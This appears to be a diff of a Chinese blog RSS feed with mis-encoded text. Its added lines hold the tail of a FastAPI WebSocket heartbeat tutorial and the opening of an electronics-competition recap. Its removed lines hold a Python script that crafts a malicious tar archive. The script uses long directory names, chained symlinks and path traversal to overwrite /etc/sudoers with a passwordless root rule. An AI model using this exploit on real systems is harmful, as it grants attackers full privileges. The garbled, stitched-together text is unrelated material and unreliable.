+<p style="font-size: 16px; margin: 20px 0"><strong style="color: rgba(186, 55, 42, 1)">â ï¸ å³é®ç»èï¼</strong> <span style="display: block; margin-left: 16px; margin-top: 6px">- å¿è·³é´éä¸è¦è¶è¿Nginxç<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">proxy_read_timeout</code>ï¼ä¸è¬è®¾30ç§æ¯è¾å®å¨ã</span> <span style="display: block; margin-left: 16px">- æ­çº¿éè¿è¦é²æï¼éè¿<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">reconnectTimer</code>é¿åéå¤éè¿ã</span> <span style="display: block; margin-left: 16px">- é¡µé¢å³é­æ¶ä¸å®è¦<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">close</code>è¿æ¥ï¼å¦åæå¡ç«¯å¯è½ä¿çå­¤å¿è¿æ¥ç´å°è¶æ¶ã</span></p>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">ð§ª ç¬¬äºé¨åï¼è·èµ·æ¥ççææ</h2>
+<p style="font-size: 16px; margin: 20px 0">å¯å¨FastAPIï¼<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">uvicorn main:app --reload</code>ï¼ï¼æå¼æµè§å¨æ§å¶å°ï¼ä½ ä¼çå°æ¯é30ç§åéä¸æ¬¡pingï¼æå¡å¨ç«å³åå¤pongãå³ä½¿ä½ æ­å¼Wi-Fiåæå¼ï¼å®¢æ·ç«¯ä¹ä¼èªå¨éè¿ï¼å¹¶ä¸éè¿åå¿è·³ç»§ç»­ãð¯</p>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">ð£ ç¬¬å­é¨åï¼é£äºå¹´æè¸©è¿çåï¼å¿çï¼</h2>
+<div style="margin-left: 8px">
+<p style="margin: 6px 0"><strong style="color: rgba(186, 55, 42, 1)">å1ï¼å¿è·³é´éå¤ªç­ï¼æå¡å¨ååå¤§</strong> ââ 1ç§ä¸æ¬¡çº¯å±èªæ®ï¼30ç§ä¸æ¬¡è¶³å¤ï¼æ¢ä¿æ´»åçèµæºã</p>
+<p style="margin: 6px 0"><strong style="color: rgba(186, 55, 42, 1)">å2ï¼æå¡ç«¯æ²¡åè¶æ¶ä¸»å¨æ­å¼</strong> ââ å®¢æ·ç«¯çªç¶æçº¿ï¼æ¯å¦ç¨æ·å¼ºå¶æè¿ç¨ï¼ï¼æå¡ç«¯ä¸ç¥éï¼è¿æ¥ä¸ç´å çåå­ãæä»¥åå°å¿è·³æ£æ¥ä¸å®è¦æï¼è¶æ¶å°±closeã</p>
+<p style="margin: 6px 0"><strong style="color: rgba(186, 55, 42, 1)">å3ï¼éè¿æ¶å¿è®°æ¸çæ§å®æ¶å¨</strong> ââ æ¯æ¬¡éè¿é½æ°å»ºä¸ä¸ª<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">setInterval</code>ï¼å¯¼è´å¤ä¸ªå¿è·³çº¿ç¨å¹¶åï¼æ¶æ¯çç¸ãè§£å³æ¹æ¡ï¼éè¿åå<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">stopHeartbeat()</code>ã</p>
+<p style="margin: 6px 0"><strong style="color: rgba(186, 55, 42, 1)">å4ï¼ååç«¯å¿è·³æ ¼å¼çº¦å®ä¸ä¸è´</strong> ââ æç¨çæ¯<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">{"type":"ping"}</code>ï¼å¦æä½ åç«¯ç¨å­æ®µ<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">heartbeat</code>ï¼ä¸å®è®°å¾å¯¹é½ï¼å¦åæå¡å¨ä¸è®¤ï¼ç¸å½äºæ²¡å¿è·³ã</p>
+<p style="margin: 6px 0"><strong style="color: rgba(186, 55, 42, 1)">å5ï¼æ²¡èèSSL/å å¯è¿æ¥</strong> ââ çäº§ç¯å¢ç¨<span style="color: rgba(186, 55, 42, 1)"><code>wss://</code></span>ï¼è¯ä¹¦éç½®è¦æ­£ç¡®ï¼å¦åè¿æ¥ç´æ¥è¢«æç»ã</p>
+</div>
+<p style="font-size: 16px; margin: 20px 0">å¦å¤ï¼å¦æä½ æ³æ´ä¼éä¸ç¹ï¼å¯ä»¥ç»å<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">asyncio.timeout</code>æè<code style="background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px">websocket.receive()</code>çè¶æ¶åæ°ï¼ä¸è¿æè§å¾ä¸é¢è¿ç§âè®°å½æåå¿è·³+åå°æ£æ¥âçæ¨¡å¼ææ¸æ°ã</p>
+<h2 style="font-size: 22px; font-weight: 600; margin: 30px 0 15px; border-bottom: 2px solid rgba(186, 55, 42, 1); padding-bottom: 6px">ð æåå°å¦ä¸å¥</h2>
+<p style="font-size: 16px; margin: 20px 0">å¿è·³æºå¶ä¸æ¯é¶å¼¹ï¼ä½å®ç¡®å®æ¯WebSocketé¿è¿æ¥ä¿ææç®åææçåæ³ãç»åæ­çº¿éè¿ï¼è½è®©ä½ çå®æ¶åºç¨å¨æ¶å£ç½ç»ç¯å¢ä¸ä¾ç¶åæºãå¦æä½ å¨çäº§ç¯å¢è¿ææ´é«è¦æ±ï¼æ¯å¦éç¾¤ä¸çè¿æ¥ç¶æåæ­¥ãå¿è·³ä¸ä¸å¡æ¶æ¯ä¼åçº§ï¼æ¬¢è¿çè¨äº¤æµã</p>
+<hr style="border: none; height: 1px; background: linear-gradient(90deg, rgba(0, 0, 0, 0), rgba(52, 152, 219, 1), rgba(0, 0, 0, 0)); margin: 40px 0">
+<p style="font-size: 18px; font-weight: 500; color: rgba(44, 62, 80, 1); margin-bottom: 10px">èæåæé ð</p>
+<p style="font-size: 16px; margin: 10px 0">è¿ç¯æç« éçä»£ç æé½æ¯ç¨è¡æ³ªæè®­æ¢æ¥çï¼ç°å¨ç´æ¥æå°±è½è·ãä½ä½ çä¸å¡åºæ¯å¯è½ä¸ä¸æ ·ï¼æ¯å¦å¿è·³é´éæ¯å¦éè¦å¨æè°æ´ï¼æå¡ç«¯è¦ä¸è¦ä¸»å¨pingï¼æ¬¢è¿å¨è¯è®ºåºåäº«ä½ çâå¥è©âè¸©åç»åï¼æèæ¶èèµ·æ¥ï¼ä¸æ¬¡ä¸çº¿åç¿»åºæ¥çä¸ç¼ï¼ä¹è®¸è½å¸®ä½ çä¸ä¸ä¸ªéå®µã</p>
+<p style="font-size: 16px; margin: 30px 0 10px"><strong style="color: rgba(186, 55, 42, 1)">å¦æä½ è§å¾æç¨ï¼ç¹èµæåäº«ç»å¢éï¼ä¸æ¬¡éå°WebSocketæ­è¿é®é¢ï¼å±ä»¬å°±ä¸åæäºãð</strong></p>
+</div>
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 17:05">2026-02-19 17:05</span>&nbsp;
+<a href="https://www.cnblogs.com/ymtianyu">ä¸åç¨åºåªå</a>&nbsp;
+éè¯»(<span id="post_view_count">84</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19625144);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625144', targetLink: 'https://www.cnblogs.com/ymtianyu/p/19625144', title: 'FastAPIå®æï¼WebSocketé¿è¿æ¥ä¿æä¸å¿è·³æºå¶ï¼ä»å¥é¨å°å¡«å' })">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ 2023å¹´çµèµå½èµç»å ]]></title>
+    <link>https://www.cnblogs.com/badboy02/p/19623709</link>
+    <guid>a21e9f8d7b8393aa8d45fdd62c943c13</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/badboy02/p/19623709" title="åå¸äº 2026-02-19 14:06">
+    <span role="heading" aria-level="2">2023å¹´çµèµå½èµç»å</span>
     
-    Args:
-        output_path: çæçtaræä»¶ä¿å­è·¯å¾ï¼é»è®¤/tmp/backup_9999.tar
-    """
-    # æé é¿ç®å½åï¼247ä¸ªdï¼ï¼ç¨äºçªç ´è·¯å¾é¿åº¦éå¶
-    long_dir_name = 'd' * 247
-    # ç¨äºæé å¤å±ç®å½çå­ç¬¦åºå
-    step_chars = "abcdefghijklmnop"
-    current_path = ""
 
-    try:
-        # ä»¥åæ¨¡å¼æå¼taræä»¶
-        with tarfile.open(output_path, mode="w") as tar:
-            # å¾ªç¯æé å¤å±ç®å½åç¬¦å·é¾æ¥
-            for char in step_chars:
-                # 1. åå»ºé¿ç®å½åçç®å½é¡¹
-                dir_info = tarfile.TarInfo(os.path.join(current_path, long_dir_name))
-                dir_info.type = tarfile.DIRTYPE  # æ è®°ä¸ºç®å½ç±»å
-                tar.addfile(dir_info)
+</a>
 
-                # 2. åå»ºæåè¯¥é¿ç®å½çç¬¦å·é¾æ¥
-                symlink_info = tarfile.TarInfo(os.path.join(current_path, char))
-                symlink_info.type = tarfile.SYMTYPE  # æ è®°ä¸ºç¬¦å·é¾æ¥ç±»å
-                symlink_info.linkname = long_dir_name  # é¾æ¥æåé¿ç®å½
-                tar.addfile(symlink_info)
-
-                # æ´æ°å½åè·¯å¾ï¼è¿å¥ä¸ä¸å±
-                current_path = os.path.join(current_path, long_dir_name)
-
-            # 3. æé å¤å±ç¬¦å·é¾æ¥è·¯å¾ï¼ç¨äºè·¯å¾éå
-            link_path = os.path.join("/".join(step_chars), "l"*254)
-            link_info = tarfile.TarInfo(link_path)
-            link_info.type = tarfile.SYMTYPE
-            link_info.linkname = "../" * len(step_chars)  # æé åéè·¯å¾
-            tar.addfile(link_info)
-
-            # 4. åå»ºæå/etcç®å½çç¬¦å·é¾æ¥ï¼escapeï¼
-            escape_info = tarfile.TarInfo("escape")
-            escape_info.type = tarfile.SYMTYPE
-            escape_info.linkname = f"{link_path}/../../../../../../../etc"
-            tar.addfile(escape_info)
-
-            # 5. åå»ºæå/etc/sudoersçç¡¬é¾æ¥ï¼sudoers_linkï¼
-            sudoers_link_info = tarfile.TarInfo("sudoers_link")
-            sudoers_link_info.type = tarfile.LNKTYPE
-            sudoers_link_info.linkname = "escape/sudoers"
-            tar.addfile(sudoers_link_info)
-
-            # 6. åå¥æ¶æåå®¹å°sudoers_linkï¼è¦ç/etc/sudoersï¼
-            malicious_content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
-            file_info = tarfile.TarInfo("sudoers_link")
-            file_info.type = tarfile.REGTYPE  # æ è®°ä¸ºæ®éæä»¶ç±»å
-            file_info.size = len(malicious_content)  # æå®æä»¶å¤§å°
-            # å°åå®¹åå¥taræä»¶
-            tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))
-
-        print(f"[+] æ¶ætaræä»¶å·²çæï¼{output_path}")
-    except Exception as e:
-        print(f"[!] çætaræä»¶å¤±è´¥ï¼{str(e)}", file=sys.stderr)
-        sys.exit(1)
-
-if __name__ == "__main__":
-    # æ¯æèªå®ä¹è¾åºè·¯å¾ï¼å¯éåæ°ï¼
-    if len(sys.argv) &gt; 1:
-        output_tar = sys.argv[1]
-    else:
-        output_tar = "/tmp/backup_9999.tar"
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        <img src="https://img2024.cnblogs.com/blog/3763221/202602/3763221-20260219000428689-1446099918.png" alt="2023å¹´çµèµå½èµç»å" class="desc_img">
+        2023å¹´å¨å½å¤§å­¦ççµå­è®¾è®¡ç«èµç»åï¼Dé¢ä¿¡å·é¢ï¼å½èµäºç­å¥ã
+ä¸äºæ¯èµç»ååç»éªæå·§
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p>--- markdownæè¿°<br>
+title: çµèµ2023å½èµDé¢æ¯èµç»å<br>
+date: 2023/8/15 11:52:25<br>
+cover: true<br>
+mathjax: false<br>
+summary: æ¯èµè¿ç¨åä¸äºåå¤å·¥ä½çç¢ç¢å¿µ<br>
+categories: Note<br>
+tags:</p>
+<ul>
+<li>çµèµ</li>
+<li>ä¿¡å·</li>
+</ul>
+<hr>
+<h2 id="è¡¥æ¡£å£°æ">è¡¥æ¡£å£°æ</h2>
+<p>ç±äºæçåå®¢æå¡å¨åå¤æ¡å°æï¼æä»¥éæ©è½¬ç§»å°åå®¢å­å¹³å°æ¥è¿è¡ä¿å­åè®°å½ãä»¥åä¹æå¯è½ä¼å¨ä¸é¢ä¸å®ææ´æ°ä¸äºææ¯ç±»åå®¢ã</p>
+<h2 id="åå¨åé¢">åå¨åé¢</h2>
+<p>ðªçªç¶æè¯å°èªå·±å·²ç»8ä¸ªææ²¡æ´æ°åå®¢äºï¼è¿æ®µæ¶é´å¶å®ä¹æ²¡éä¸å¥å¤ªå¤æçäºï¼å¤§æ¦å°±æ¯ä¸äºæ²æ·ä¹ç±»çï¼å³å®äºä¹åçå­¦ä¸å»åï¼æ¨åäºæ¬æ ¡çç ç©¶çãè¿ä¸æ­¥è®¤è¯äºä¸ç¾¤æªæ¥å¿åéåççåé¨ï¼æ¿æç½ç©å¡å°è¾¾æ·éä¹æ¯åçå½ä¹æ³ªï¼ç ç å°æ²»æäºä¸éµå­ççµå­é³ç¿ï¼ä»¥åå¼å§å¥èº«ï¼å­çï¼ã<br>
+å½ç¶ï¼çµèµä»ä¹çä¹æ¯æå¨åå¤çï¼ç±äºå¢éå¶ä»ä¸¤ä¸ªé½æ¯ç¡¬ä»¶ä½¬ï¼ä»ä»¬æ¿åçç»æ¿ä¸çæ¥è°è¯çæ°´æ·±ç«ç­ï¼æåªéè¦å®å®ééçåä»£ç å°±è¶³å¤äºï¼ç¬ï¼ï¼æ¯å¤©å®éªå®¤ä¸ä¸ç­ï¼æèªå·±çé¨åæå®ï¼ç¶åå»å¥èº«æ¿é»ç¼ä¸ä¼ï¼åæ¥ç¾ç¾å ä¸ªé¤æ´ä¸ªæ¾¡ï¼ç¶åæææºå»ç¡è§ï¼ä¹ç®æ¯æç§æä¹ä¸çå¹³éççæ´»ï¼æ±ä¹ä¸å¾ãæ¯ç«å½åå³å®æçµèµè¯´å°åºä¹åªæ¯ä¸ºäºæåèªå·±ï¼æ¢ç´¢ä¸ä¸çµå­ä¸ççå¥¥å¦ï¼è¿ä¹ä¹èµ°è¿æ¥ä¹æ¯éå¨åæï¼ä¹å¸ææåè½æä¸ä¸ªå¥½ç»æã<br>
+æªæ­¢å°ååå®¢çæ¶åï¼æä»¬ç»çæç»©çèµä»¥çä¸å¹¶åç¬¬ä¸åºçº¿ï¼ç»¼åæµè¯åºè¯¥ä¹è½è¿çº¿ï¼å±±ä¸å¤§å­¦å½æµå¤æµä¸åºæå¤çè¯ï¼åºè¯¥æ¯å½äºä»¥ä¸ã</p>
+<p>è¿ç¯åå®¢ä¼åä¸ºä¸ä¸ä¸¤é¨åï¼ä¸ç¯ä¸»è¦æ¯æ¯èµçè¿ç¨åä¸äºåç½®çåå¤(æ²¡æè¥å»çç¢ç¢å¿µ)ï¼ä¸ç¯ä¸»è¦æ¯ä¸äºç®æ³å·ä½çå®ç°(ä¸äºææ¥ä¹ä¸ççµæºä¸å¨ï¼å¤§ä½¬è½»é¤)ã</p>
+<h2 id="æ¯èµè¿ç¨">æ¯èµè¿ç¨</h2>
+<ol>
+<li>åå¤é¶æ®µ</li>
+</ol>
+<p>æä»¬éä¼ä¸ç´ä»¥æ¥è®­ç»çæ¯ä»ªè¡¨åé«é¢é¢ï¼ä¸å¼å§ä¾§éFPGAé«éä¿¡å·ééåæ°å­åå¤çè¿ä¸åï¼ä½æ¯åé¢éæ¸æè¯å°ï¼å¯¹äºçµèµçææ èå´åå¥½åä¹ä¸éè¦è¿ä¹é«çé¢çï¼é«è½½æ³¢å¸¦æ¥çé«éæ ·çé®é¢å¯ä»¥éè¿ä¸æ··é¢ç¼è§£ï¼èé«é¢ç´éå¸¦æ¥æ¯çFIRæ»¤æ³¢å¨çèµæºæ¶èæåå¢å ï¼ä»¥åæ°å­åå¤çå¸¦æ¥çèµæºå ç¨åéååªå£°é®é¢ã</p>
+<p><img alt="ZYNQ7100å¹³å°" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ZYNQ7100%E5%B9%B3%E5%8F%B0.webp" class="lazyload"><br>
+è¿æ¯æä»¬åå¤çZYNQ7100çå¹³å°ï¼å¯ä»¥å¤æ¥é«éADDAï¼æ¿è½½DDR3.<br>
+ä½æ¯å§ï¼ZYNQå¹³å°çç»¼åéåº¦ååºåé¾åº¦ä»¥åVerilogä»£ç çéªè¯é¾åº¦ï¼å¨åç§å¿äºçç«èµéï¼å¦ææ²¡æé¿æçè®­ç»ååå¤ï¼å¨æ¯èµé£åå¤©çæ¥ä¸å¤´å»åï¼ææä¼ç¿»è½¦ã</p>
+<p>äºæ¯å¨è®­ç»åæåéåSTM32H743çåçæºå¹³å°ï¼ä¾§éæ¨¡åå å åçå¥å£®æ§åä»£ç çå¯å¤ç¨æ§ã</p>
+<p>ä»è®­ç»å¼å§ï¼ðªå°±ææè¯å°æä¸äºç®æ³ï¼å°¤å¶æ¯FFTåæè¿ä¸åï¼åæäºç¬ç«çå½æ°å»è¿è¡ä¸äºåæ°çåæï¼ç¶åæå¶ä»çåæ¯å±å¹æ¾ç¤ºï¼æé®è¾å¥ï¼å¤è®¾é©±å¨ï¼é½å°è£æä¸»å¾ªç¯ä¸­çå½æ°ï¼ç¨åæ°åæ å¿ä½å»æ§å¶ãä¸å¾ä¸è¯´å¨çµèµçä¿¡å·åæé¢ä¸­è¿æ¯ä¸ç§å¾å¥½ç¨çä»£ç æ¶æã</p>
+<p><img alt="Mainå½æ°æªå¾" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/Main%E5%87%BD%E6%95%B0%E6%88%AA%E5%9B%BE.webp" class="lazyload"></p>
+<p>æ¬æ¬¡ä»£ç çç»ç»ç»æï¼å¯ä»¥æ¸æ¥ççå°ï¼æ¯é¦åè¿è¡ADCééï¼FFTè®¡ç®ï¼ç¶åå°åæ°ä¼ å¥Judge_ModeTypeå½æ°è®¡ç®åºè°å¶ç±»åï¼ç¶åè¿å¥ç¸åºçé¨åå»è¿è¡åæåæ¾ç¤ºã</p>
+<p>2.æ­£å¼å¼å§</p>
+<p>æ¯èµçé£å å¤©ï¼ç¬¬ä¸å¤©ä¸å8ç¹éåä¸æ¿å°é¢ç®åºæ¬ä¸å°±ç¡®å®äºæ¯Dé¢ï¼ç¶åå°±å¼å§ç»ç³»ç»æ¡å¾ï¼æ¾æ¨¡åï¼æ­ç³»ç»ã<br>
+ðªæ¯ä¹ç¹éå°çå®éªå®¤ãç¶åä¸çé¢ï¼å¦è±ï¼MaåMfï¼ è¿ä¸æ¯èæååï¼å»å¹´çèµè¿ä¸¤ä½ééçº§ï¼ç¹å«æ¯Mfï¼è®©æ æ°éä¼å¹ç¾½èå½ã<br>
+å¶å¥å¦çå¤å¼åè«åå¶å¦çç®ä¸åé®é¢ï¼é¾å°äºä¸å¤§æ¹çµèµå£¬ã<br>
+ä¸è¿ç®æ³æ¹é¢ðªæ©æåºå¯¹ï¼å·ä½è¯·çåæåæã<br>
+éåææ··é¢æ¨¡åå¼å¥½ï¼ç¡®å®å¥½ä¸­é¢é¢çåï¼ææ··é¢åçä¿¡å·éå¥ADCæ¨¡åï¼æ­¤æ¶ðªè¿è¡äºç®åçæµè¯ï¼ç¡®å®äºADCéæ ·çã<br>
+ç¶åå°±å¼å§äºç®æ³çç¼åãå¨ç¬¬ä¸å¤©çä¸­åå°±æMaçè®¡ç®æå®äºï¼ç²¾åº¦è¯¯å·®å¤§æ¦å¨0.05å·¦å³ã<br>
+ç¶åä¸åæMfçç®æ³ä¹åºæ¬è°è¯æ­£ç¡®äºï¼ç²¾åº¦è¯¯å·®å¨0.2å·¦å³ï¼æå°éçå¤å¼é®é¢ï¼è¿æ¶åæ¶é´å·²ç»æ¯ç¬¬ä¸å¤©æä¸ç8ç¹ï¼ðªè¿è¡äºç¬¬ä¸æ¬¡å¤ä»½ãï¼æ¶å¸¸å¤ä»½çæ¯å¥½ä¹ æ¯ï¼<br>
+<img alt="å¤ä»½æªå¾" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E5%A4%87%E4%BB%BD%E6%88%AA%E5%9B%BE.webp" class="lazyload"><br>
+è¿æ¯å·¥ç¨çå æ¬¡å¤ä»½å¾ï¼å¯ä»¥çå°ä»7æ17æ¥ç¡®å®äºåºæ¬å¹³å°ä¹åï¼å°±æ¯å å¤©ä¸å¤ä»½ï¼å¨æ¯èµé£å å¤©æ´æ¯ä¸å¤©å¤ä»½å æ¬¡ã<br>
+ä¸ºä»ä¹æ²¡æä½¿ç¨gitä¹ç±»ççæ¬æ§å¶å·¥å·å¢ï¼å ä¸ºæä¸ä¼ï¼å¶å®æ¯æå¾å»ºä»åº+æ²¡æ¾å°åéçæç®¡å¹³å°ï¼githubè¿ä¸ä¸ï¼giteeä¸æ³ç¨ï¼<br>
+ç¶åå°±æ¯ASKï¼FSKï¼PSKçå¤å«ãè§£è°ä»¥åFSKçhåæ°è®¡ç®é®é¢ï¼æ»çè¯´æ¥ï¼è¿ä¸ªè±è´¹äºðªä¸çªåå¤«ï¼ä¹ç®æ¯ææ ¸å¿çä»£ç é¨åã<br>
+ç¬¬äºå¤©çä¸­åå®æäºæ¨¡æè°å¶åæ°å­è°å¶ä¸¤å¤§ç±»çåæ­¥å¤æ­ï¼ä¸åè¿ä¸æ­¥å®æäºæ¨¡æçAMï¼FMï¼CWçè¿ä¸æ­¥å¤æ­ï¼ä»¥åæ°å­çASKï¼FSKï¼PSKçè¿ä¸æ­¥å¤æ­åè§£è°ã(åå®çä¸å¤©)<br>
+<img alt="PSKè§£è°" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/PSK%E8%A7%A3%E8%B0%83.webp" class="lazyload"><br>
+ç¬¬äºå¤©æä¸åå¯å®¤çæ¶åðªå¨åéåé²æ¯çæ¶åçªç¶æ³å°äºFSKçhåæ°è®¡ç®æ¹æ³ï¼ç¶åå¨å°æ¬æ¬ä¸è®°äºä¸æ¥ã<br>
+ç¬¬ä¸å¤©ï¼ðªä¸å°å®éªå®¤å°±å¼å§çæéªè¯èªå·±çæ³æ³ï¼åç°å®å¨å¯ä»¥ï¼ç´æ¥èæ¹èµ·é£ã<br>
+ç¶åä¸åçæ¶é´å°±æ¯å å¥å°é¢å¼å³åæ»¤æ³¢å¨ï¼æ¾å¤§å¨ç­åä»¶ï¼å®æäºç³»ç»çæ´ä½çº§èåæåè§£è°æ³¢å½¢çå®æ¶åæ¢ã<br>
+ç¬¬ä¸å¤©çæä¸å¶å®æ´ä¸ªç³»ç»å·²ç»çº§èå¹¶ä¸æµè¯å¥½äºã<br>
+æåä¸å¤©å°±æ¯ä¸äºé¦ä¸æ·»è±çåè½ï¼æ¯å¦å®æ¶é¢è°±æ¾ç¤ºåQPSKçå¤æ­ä»¥åé«é¢è½½æ³¢ä¸çè§£è°ä»¥åååº¦çä¿®æ­£ï¼å¨ä¸åä¸ç¹å·¦å³å®æäºæåçæµè¯åå°ç®±ã<br>
+<img alt="å°ç®±" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E5%B0%81%E7%AE%B1.webp" class="lazyload"><br>
+æ»çæ¥è¯´è¿å å¤©çæµç¨è¿æ¯ç¨³æç¨³æï¼éæ­¥æ¨è¿çãæä»¬å¢éä¸ç´ä»¥æ¥éåçä¹å¾ä¸éï¼æçè´¼é«ï¼æååç°åºæ¥çææå°±æ¯çµèµè¿ä¸å¤©æ¯å¤©æä¸11ç¹é½åå¯å®¤ç¡è§äºï¼ç¬¬äºå¤©9ç¹åå°å®éªå®¤ï¼ä¹è¿è½å®æææçåºç¡åæé«ææ å¹¶ååº3é¡¹å¶ä»ææ ãä¸ç¥ä¸è§ä¸­å®æäºæä»¬å¢éåå¼å§æ¥è§¦çµèµçæ¶çä¸ä¸ªç©ç¬-å¸æä»¥åè½ä¸ç¬å¤å°±æå®çµèµã<br>
+<img alt="äº¤ä½å" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E4%BA%A4%E4%BD%9C%E5%93%81.webp" class="lazyload"><br>
+ä½ä¸ºä¸éä¸»ï¼åå¤äº¤ä½åä¹æ¯å¾åççç½¢ã</p>
+<p>3.çèµæµè¯</p>
+<p>å°ç®±åçç¬¬äºå¤©å°±æ¯çæµäºï¼æ»çæ¥è¯´è¿æ¯è®é¡ºå©çï¼ææåè½é½æ¼ç¤ºåºæ¥äºï¼æµè¯è¡¨çææ ä¹æ²¡æå¾é¾çç¹ã<br>
+æµå®ç´æ¥åæååºå»å¿«ä¹ååï¼ç­å¾ç»¼åæµè¯ååã</p>
+<p>4.ç»¼åæµè¯<br>
+ç±äºðªçè®ºä¸æ¯çº¯è½¯ä»¶éå(å¶å®ðªä¹ä¼ç»æ¿å­åçæ¿å­ï¼è¿å°±æ¯EEerçç´ å»)ï¼ç»¼åæµè¯çç¡¬ä»¶å¤§ä¸å½ç¶å°±äº¤ç»æçä¸¤ä½å¤§ç¹éåäºï¼ðªåªéè¦å¨æè¾¹åä¸ªæ¥åç®ä¸ªåæ°å°±å¥½ã<br>
+å¨åå¤ç¡¬ä»¶æµè¯å¨ä»¶ï¼æä»¬æµè¯äºåç§555çµè·¯ï¼äºæç®¡æ£æ³¢ï¼å¾®åç§¯åå¨ï¼å æ³å¨ï¼å¸¦éæ»¤æ³¢å¨ççµè·¯å¾ã<br>
+ç»¼åæµè¯é£å¤©ï¼ä¸è¿ç°åºï¼åç°é¢ç®ç«ç¶æ¯æ¨¡æè®¡ç®å¨ï¼ç¨æ¥è§£ä¸ä¸ªå¾®åæ¹ç¨ã<br>
+ä¸è¿ç¨å åæï¼å°±ä¼åç°å¶æ¬è´¨æ¯ææ°æ¡¥æ­£å¼¦åçå¨ï¼ä¸è§æ³¢åçå¨ï¼ä¸¤ä¸ªç§¯åå¨ï¼ä¸ä¸ªå¾®åå¨ï¼ä¸ä¸ªå æ³å¨çç»åã<br>
+è¿ä¸éé¢çæ¯ä¸é¡¹åç¬æåºæ¥é½å¾ç®åï¼ä½æ¯å¨å½æ¶æ¶é´æ¯è¾ç´§ä¿çæåµä¸ï¼æä»¬è½ç¶æçµè·¯å¨é¨çº§èåºæ¥äºï¼ä½æ¯å¨é¶ç¶æçæ¶åï¼å¹¶æ²¡æåè®¡ç®çé£æ ·ï¼äº§çä¸ä¸ª33Hzçèªæ¿æ³¢å½¢ã<br>
+ä¹è®¸æ¯ä¸­é´çæé¡¹RCå¸¸æ°æ²¡æéç½®æ­£ç¡®ï¼ä¹è®¸æ¯æä¸æ®µæªä¿®æ­£ç¸å·®ï¼ä¹è®¸æ¯æä¸æ®µçåç½®éè¦æ¶é¤ï¼æ»æ¯é¶ç¶æçæ¶åå°±æ¯å¦¹æåºæ³¢å½¢ã<br>
+è¯´å°æ¨¡æè®¡ç®çµè·¯ï¼å¶å®è¿æ¯ä¸ªå±å¼æ¥è®²æéå¸¸å¤å¯ä»¥è®²çè¯é¢ï¼æ³è¿ä¸æ­¥ç ç©¶çåå­¦å¯ä»¥ç§»æ­¥CNPPå¤§ä½¬çæ¨¡æè®¡ç® <a href="https://hackaday.io/project/191142-analog-lorenz-attractor-computer/details" target="_blank" rel="noopener nofollow">https://hackaday.io/project/191142-analog-lorenz-attractor-computer/details</a><br>
+æä»¬ä¹å°±åæ­¢äºåé¢çè¾å¥æ¿å±ãéå¾æ¯èµæ¶é´ç»æï¼æ¯ç«è¿åªæ¯ä¸ä¸ªè¾¾æ æµè¯ï¼å°±ä¸åè¿å»åè¿ä¸æ­¥çåé©äºã</p>
+<p>æä¸è¯´ä¸ä¸­åå­¦æ ¡æä¾çé¥­èè¿å¯ä»¥ï¼èåæåè±ç§çèï¼æ¨è³çèï¼æ°´ç®è¾ï¼è¿æé¸å¥¶åæ°´æï¼æTMåååã</p>
+<p>4.å½èµè¯æµ</p>
+<p>ç­ðªç©åæ¥æ´æ°</p>
+<h2 id="é¢ç®åæ">é¢ç®åæ</h2>
+<p><img alt="é¢ç®æè¿°1" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B01.webp" class="lazyload"></p>
+<p><img alt="é¢ç®æè¿°2" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B02.webp" class="lazyload"></p>
+<p><strong>é¢ç®åæï¼*çæ°éä¸ºéè¦ç¨åº¦ï¼</strong></p>
+<ul>
